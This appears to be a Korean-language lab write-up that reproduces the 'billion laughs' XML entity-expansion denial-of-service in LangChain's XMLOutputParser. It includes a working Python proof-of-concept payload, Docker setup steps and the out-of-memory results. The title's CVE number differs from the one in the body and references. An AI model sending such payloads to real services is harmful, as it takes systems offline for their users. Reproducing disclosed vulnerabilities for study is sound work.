# Billion laughs Attack in LangChain (CVE-2024-1445)

영향을 받는 버전: langchain >=0,<0.1.14  
해당 취약점은 XXE 익스플로잇의 일종인 Billion Laughs Attack을 가능하게 한다.

## Description

**CVE-2024-1455**는 XXE 익스플로잇의 일종인 Billion Laughs Attack을 가능하게 한다.  
Billion Laughs Attack은 XML 파싱 프로세스를 악용한 XXE 취약점의 한 유형이다. 해당 공격은 XML 문서 내에 여러 계층의 엔티티를 중첩하여 XML 파서가 엔티티를 확인하고 확장하는 과정에서 과도한 CPU 및 메모리 리소스를 소모하게 만든다. 이러한 과도한 리소스 사용은 서비스 거부 공격(DoS)으로 이어져 영향을 받는 시스템의 가용성과 성능에 심각한 영향을 미친다.

---

## Environmental Construction

* 취약한 버전의 langchain과 해당 버전에 맞는 패키지를 찾아 `requirements.txt`를 구성한다.
* Langchain의 XMLOutputParser를 익스플로잇 할 수 있는 `poc.py`를 작성한다.
* 이후 `Dockerfile`과 `docker-compose.yml` 파일을 작성한다.

---

## Proof of Concept

```
docker compose up
```
* 해당 명령으로 `docker-compose.yml` 파일을 실행한다.
  
```
from langchain.output_parsers import XMLOutputParser


payload="""<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>"""

parser = XMLOutputParser()

parser.parse(payload)
```
* 이후 해당 `poc.py`가 실행된다.

---

## Output
* Successful Exploit:  
![image](https://github.com/user-attachments/assets/a16acad6-4456-4c93-a7bc-08b139f4db3f)
* 해당 이미지처럼 137 코드가 반환되면서 컨테이너가 종료되면 익스플로잇 성공.
* 137 코드는 Dokcer의 OOM(Out of Memory) 에러로 Billion Laughs Attack으로 인해 컨테이너의 메모리가 모두 소모되어 OOM 에러가 발생한다.
<br>

![after2](https://github.com/user-attachments/assets/a9a85804-2508-4f2b-99ee-26c0a7cbc1ac)
* 보다 자세한 결과 확인을 위해 `Dockfile`에서 `/bin/bash`를 실행하게 수정 후 `htop`으로 리소스 상태를 확인해본다.
* `poc.py` 실행 결과 CPU 사용량과 메모리 소비량이 급격히 늘어나는 것을 볼 수 있다.
<br>

![after3](https://github.com/user-attachments/assets/e54a2d39-152c-4a4a-8455-db201cf5386b)
* 메모리 과다 사용으로 인해 컨테이너에서 해당 프로세스를 SIGKILL로 종료한다.

---

## Reference
https://cve.mitre.org/cgi-bin/cvename.cgi?name=2024-1455  
https://data.safetycli.com/vulnerabilities/CVE-2024-1455/66962/  
https://huntr.com/bounties/4353571f-c70d-4bfd-ac08-3a89cecb45b6
